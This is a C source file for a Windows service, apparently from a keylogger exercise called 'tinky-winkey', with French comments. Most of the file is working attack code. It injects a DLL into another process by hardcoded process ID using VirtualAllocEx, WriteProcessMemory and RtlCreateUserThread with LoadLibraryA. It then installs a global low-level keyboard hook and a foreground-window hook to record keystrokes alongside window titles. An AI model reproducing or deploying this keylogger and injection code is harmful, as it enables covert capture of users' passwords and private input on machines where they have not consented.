#include "winkey.h"

extern HANDLE svcStopEvt;
extern SERVICE_STATUS_HANDLE svcStatusHandle;
extern SERVICE_STATUS svcStatus;
extern HHOOK winHook;
extern HWND gh_hwndMain;
extern BOOL foregroundWindowChanged;
extern char foregroundWindowTitle[4096];

VOID WINAPI SvcMain(DWORD ac, LPTSTR *av)
{
    svcStatusHandle = RegisterServiceCtrlHandler(SVC_NAME, SvcCtrlHandler);
    if (!svcStatusHandle)
    {
        printf("Impossible d'enregistrer la fonction de controle.\n");
        exit(1);
    }
    svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    svcStatus.dwServiceSpecificExitCode = 0;
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
    SvcInit(ac, av);
}

VOID SvcInit(DWORD ac, LPTSTR *av)
{
    (void)ac;
    (void)av;
    // un event sera cree lorsque le sewrvice stoppera
    svcStopEvt = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (svcStopEvt == NULL)
    {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    //on previent le gestionnaire de service que le service a demarre
    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
    HANDLE procHdl = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,FALSE, 12524);
    if (procHdl == NULL)
    {
        log("Failed\n", 1, TRUE);
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    LPCSTR dllPath = "E:\\tinky-winkey\\dll.dll";
    log("Thread began ?", 1, TRUE);
    LPVOID baseAddr = VirtualAllocEx(procHdl, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL)
    {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    WriteProcessMemory(procHdl, baseAddr, dllPath, strlen(dllPath) + 1, NULL);
    HMODULE ntdll=LoadLibrary("ntdll.dll");

    RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(ntdll,"RtlCreateUserThread");
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread;

    NTSTATUS status = RtlCreateUserThread(
        procHdl,
        NULL,
        FALSE,
        0,
        0,
        0,
        loadLib,
        baseAddr,
        &hThread,
        NULL
    );
    if (!NT_SUCCESS(status)) {
    char buf[128];
    sprintf(buf, "RtlCreateUserThread failed: 0x%08X\n", status);
    log(buf, 1, TRUE);
}
    WaitForSingleObject(hThread, INFINITE);
    log("Thread terminated ?", 1, TRUE);
    log("[tinky service started]\n", CHAR_MODE, TRUE);
    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    if (winHook == NULL || winEvt == NULL)
        exit(PrintError());
    foregroundWindowChanged = TRUE;
        log("[Beofre GetWindowTitle : INside main loop]\n", CHAR_MODE, TRUE);
    GetWindowTitle(GetForegroundWindow());
        log("[Beofre GetWindowTitle : INside main loop]\n", CHAR_MODE, TRUE);

    MSG msg;
    /**** TEST */
    while (1)
    {
        log("[Beofre Get message : INside main loop]\n", CHAR_MODE, TRUE);
        if (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        log("[After getmessage]\n", CHAR_MODE, TRUE);
        DWORD stopEvt = WaitForSingleObject(svcStopEvt, 1);
        if (stopEvt == WAIT_OBJECT_0)
        {
            ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
            UnhookWindowsHookEx(winHook);
            UnhookWinEvent(winEvt);
            exit(0);
        }
    }
        /*** FIN */
}

VOID WINAPI SvcCtrlHandler(DWORD ctrl)
{
    switch (ctrl)
    {
        case SERVICE_CONTROL_STOP:
            ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
            SetEvent(svcStopEvt);
            ReportSvcStatus(svcStatus.dwCurrentState, NO_ERROR, 0);
            break;
        case SERVICE_CONTROL_INTERROGATE:
            ReportSvcStatus(svcStatus.dwCurrentState, NO_ERROR, 0);
            break;
        default:
            break;
    }
}

VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint)
{
    static DWORD savedCheckPoint = 1;

    svcStatus.dwCurrentState = currentState;
    svcStatus.dwWin32ExitCode = win32ExitCode;
    svcStatus.dwWaitHint = waitHint;
    //si le service doit demarrer, ne pas accepter de controle
    if (currentState == SERVICE_START_PENDING)
        svcStatus.dwControlsAccepted = 0;
    else
        svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    // le checkpoint est utile lors des operations longues, et lorsque le service
    // doit faire plusieurs operation avant de demarrer
    if (currentState == SERVICE_RUNNING || currentState == SERVICE_STOPPED)
        svcStatus.dwCheckPoint = 0;
    else
        svcStatus.dwCheckPoint = savedCheckPoint++;
    //on set le statut du service pour le gestionnaire de service.
    SetServiceStatus(svcStatusHandle, &svcStatus);
}